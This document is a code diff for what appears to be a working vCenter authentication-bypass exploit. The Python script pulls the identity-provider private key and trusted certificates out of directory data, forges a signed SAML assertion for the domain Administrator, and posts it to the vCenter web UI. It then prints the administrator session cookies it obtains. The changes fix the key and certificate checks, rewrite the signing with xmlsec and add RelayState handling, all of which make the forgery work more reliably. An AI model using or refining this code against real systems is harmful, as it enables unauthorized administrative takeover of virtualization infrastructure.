@@ -15,12 +15,14 @@ import ldap
 import lxml.etree as etree
 import requests
 import urllib3
-from signxml import XMLSignatureProcessor, XMLSigner
+import xmlsec
 from datetime import datetime
 from dateutil.relativedelta import relativedelta
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-idp_cert_flag = b'\x30\x82\x04'
+session = requests.Session()
+
+idp_cert_flag = b'\x30\x82'
 trusted_cert1_flag = b'\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31\x2c\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x69\x66\x69\x63\x61\x74\x65\x43\x68\x61\x69\x6e\x73\x2c' # cn=TrustedCertChain-1,cn=TrustedCertificateChains,
 trusted_cert2_flag = b'\x01\x00\x12\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31' # \x01\x00\x12TrustedCertChain-1
 not_it_list = [b'Engineering', b'California', b'object']
@@ -35,7 +37,6 @@ r"""<?xml version="1.0" encoding="UTF-8"?>
   </saml2p:Status>
   <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" ID="_91c01d7c-5297-4e53-9763-5ef482cb6184" IssueInstant="$ISSUEINSTANT" Version="2.0">
     <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">https://$VCENTER/websso/SAML2/Metadata/$DOMAIN</saml2:Issuer>
-    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#" Id="placeholder"></ds:Signature>
     <saml2:Subject>
       <saml2:NameID Format="http://schemas.xmlsoap.org/claims/UPN">Administrator@$DOMAIN</saml2:NameID>
       <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
@@ -103,13 +104,29 @@ def writekey(bytes, verbose):
     return key
 
 
-def check_key_valid(key, verbose=False):
-    lines = key.splitlines()
-    if lines[1].startswith('MI'):
+def check_key_valid(key_bytes, verbose=False):
+    """
+    PKCS keys begin with the following hex structure
+    30 82 ?? ?? 02 01 00
+    """
+    if key_bytes.startswith(b"0\x82") and key_bytes[4:7] == b"\x02\x01\x00":
         return True
     else:
         if verbose:
-            print('[!] Certificate does not begin with magic bytes')
+            print("[!] Key does not begin with magic bytes")
+        return False
+
+
+def check_cert_valid(cert_bytes, verbose=False):
+    """
+    x509 certs begin with the following hex structure
+    30 82 ?? ?? 30 82
+    """
+    if cert_bytes.startswith(b"0\x82") and cert_bytes[4:6] == b"0\x82":
+        return True
+    else:
+        if verbose:
+            print("[!] Certificate does not begin with magic bytes")
         return False
 
 
@@ -117,22 +134,19 @@ def get_idp_cert(stream, verbose=False):
     tup = stream.findall(idp_cert_flag, bytealigned=True)
     matches = list(tup)
     for match in matches:
-        stream.pos = match - 32
-        flag = stream.read('bytes:3')
-        if flag == b'\x00\x01\x04':
-            size_hex = stream.read('bytes:1')
-            size_hex = b'\x04' + size_hex
-            size = int(size_hex.hex(), 16)
-            cert_bytes = stream.read(f'bytes:{size}')
-            if any(not_it in cert_bytes for not_it in not_it_list):
-                continue
+        stream.pos = match - 16
+        size_hex = stream.read('bytes:2')
+        size = int(size_hex.hex(), 16)
+        cert_bytes = stream.read(f'bytes:{size}')
+        if any(not_it in cert_bytes for not_it in not_it_list):
+            continue
 
-            key = writekey(cert_bytes, verbose)
-            if not check_key_valid(key):
-                continue
+        if not check_key_valid(cert_bytes):
+            continue
+        key = writekey(cert_bytes, verbose)
  
-            print('[*] Successfully extracted the IdP certificate')        
-            return key
+        print('[*] Successfully extracted the IdP certificate')        
+        return key
     else:
         print(f'[-] Failed to find the IdP certificate')
         sys.exit()
@@ -188,9 +202,9 @@ def get_trusted_cert1(stream, verbose=False):
                     print('[!] Cert does not contain ssoserverSign - keep looking')
                 continue
       
-            cert1 = writepem(cert1_bytes, verbose)
-            if not check_key_valid(cert1):
+            if not check_cert_valid(cert1_bytes):
                 continue
+            cert1 = writepem(cert1_bytes, verbose)
 
             print('[*] Successfully extracted trusted certificate 1')
             return cert1, domain
@@ -222,9 +236,9 @@ def get_trusted_cert2(stream, verbose=False):
         if verbose:
             print(f'Cert 2 Size: {cert2_size}')
 
-        cert2 = writepem(cert2_bytes, verbose)
-        if not check_key_valid(cert2):
+        if not check_cert_valid(cert2_bytes):
             continue
+        cert2 = writepem(cert2_bytes, verbose)
 
         print('[*] Successfully extracted trusted certificate 2')
         return cert2
@@ -236,14 +250,14 @@ def saml_request(vcenter):
     """Get SAML AuthnRequest from vCenter web UI"""
     try:
         print(f'[*] Initiating SAML request with {vcenter}')
-        r = requests.get(f"https://{vcenter}/ui/login", allow_redirects=False, verify=False)
+        r = session.get(f"https://{vcenter}/ui/login", allow_redirects=False, verify=False)
         if r.status_code != 302:
             raise Exception("expected 302 redirect")
         o = urlparse(r.headers["location"])
         sr = parse_qs(o.query)["SAMLRequest"][0]
         dec = base64.decodebytes(sr.encode("utf-8"))
         req = zlib.decompress(dec, -8)
-        return etree.fromstring(req)
+        return etree.fromstring(req), parse_qs(o.query)["RelayState"][0]
     except:
         print(f'[-] Failed initiating SAML request with {vcenter}')
         raise
@@ -271,36 +285,74 @@ def fill_template(vcenter_hostname, vcenter_ip, vcenter_domain, req):
         print('[-] Failed generating the SAML assertion')
         raise
 
-
 def sign_assertion(root, cert1, cert2, key):
     """Sign the SAML assertion in the response using the IdP key"""
     try:
         print('[*] Signing the SAML assertion')
-        assertion_id = root.find("{urn:oasis:names:tc:SAML:2.0:assertion}Assertion").get("ID")
-        signer = XMLSigner(c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#")
-        signed_assertion = signer.sign(root, reference_uri=assertion_id, key=key, cert=[cert1, cert2])
-        return signed_assertion
+        assertion = root.find("{urn:oasis:names:tc:SAML:2.0:assertion}Assertion")
+        assertion_id = assertion.get("ID")
+   
+        ctx = xmlsec.SignatureContext()
+        ctx.key = xmlsec.Key.from_memory(key, xmlsec.KeyFormat.PEM)
+        ctx.key.load_cert_from_memory(cert1, xmlsec.KeyFormat.PEM)
+        ctx.key.load_cert_from_memory(cert2, xmlsec.KeyFormat.PEM)
+ 
+        sign_node = xmlsec.template.create(root, xmlsec.Transform.EXCL_C14N, xmlsec.Transform.RSA_SHA256, ns="ds")
+        assertion.insert(1, sign_node)
+        
+        ref = xmlsec.template.add_reference(sign_node, xmlsec.Transform.SHA256, uri=f"#{assertion_id}")
+        xmlsec.template.add_transform(ref, xmlsec.Transform.ENVELOPED)
+        
+        exc_c14n_transform = xmlsec.template.add_transform(ref, xmlsec.Transform.EXCL_C14N)
+        inclusive_ns = etree.SubElement(
+            exc_c14n_transform,
+            f"{{{xmlsec.Transform.EXCL_C14N.href}}}InclusiveNamespaces",
+            nsmap={"ec": xmlsec.Transform.EXCL_C14N.href}
+        )
+        inclusive_ns.set("PrefixList", "xsd xsi")
+
+        key_info = xmlsec.template.ensure_key_info(sign_node)
+        xmlsec.template.add_x509_data(key_info)
+       
+        # Remove the line feeds that break the signature
+        parser = etree.XMLParser(remove_blank_text=True)
+        root_str = etree.tostring(root)
+        root = etree.XML(root_str, parser=parser)
+
+        sign_node = xmlsec.tree.find_node(root, xmlsec.Node.SIGNATURE)
+        assertion = root.find("{urn:oasis:names:tc:SAML:2.0:assertion}Assertion")
+        ctx.register_id(node=assertion, id_attr="ID")
+        ctx.sign(sign_node)
+
+        return root
     except:
         print('[-] Failed signing the SAML assertion')
         raise
 
-
-def login(vcenter, saml_resp):
+def login(vcenter, saml_resp, relaystate):
     """Log in to the vCenter web UI using the signed response and return a session cookie"""
     try:
         print('[*] Attempting to log into vCenter with the signed SAML request')
-        resp = etree.tostring(s, xml_declaration=True, encoding="UTF-8", pretty_print=False)
-        r = requests.post(
+        resp = etree.tostring(saml_resp, xml_declaration=True, encoding="UTF-8", pretty_print=False)
+
+        if relaystate == None:
+            data = {"SAMLResponse": base64.encodebytes(resp)}
+        else:
+            data = {"SAMLResponse": base64.encodebytes(resp), "RelayState":relaystate}
+
+        r = session.post(
             f"https://{vcenter}/ui/saml/websso/sso",
             allow_redirects=False,
             verify=False,
-            data={"SAMLResponse": base64.encodebytes(resp)},
+            data=data,
         )
         if r.status_code != 302:
             raise Exception("expected 302 redirect")
-        cookie = r.headers["Set-Cookie"].split(";")[0]
-        print(f'[+] Successfuly obtained Administrator cookie for {vcenter}!')
-        print(f'[+] Cookie: {cookie}')
+        cookies = r.headers["Set-Cookie"].split(",")
+        print(f'[+] Successfuly obtained Administrator cookies for {vcenter}!')
+        print(f'[+] Cookies:')
+        for cookie in cookies:
+            print("\t" + cookie.lstrip())
     except:
         print('[-] Failed logging in with SAML request')
         raise
@@ -344,7 +396,7 @@ if __name__ == '__main__':
 
     # Generate SAML request
     hostname = get_hostname(args.target)
-    req = saml_request(args.target)
+    req, relaystate = saml_request(args.target)
     t = fill_template(hostname, args.target, domain,req)
     s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_cert)
-    c = login(args.target, s)
+    c = login(args.target, s, relaystate)
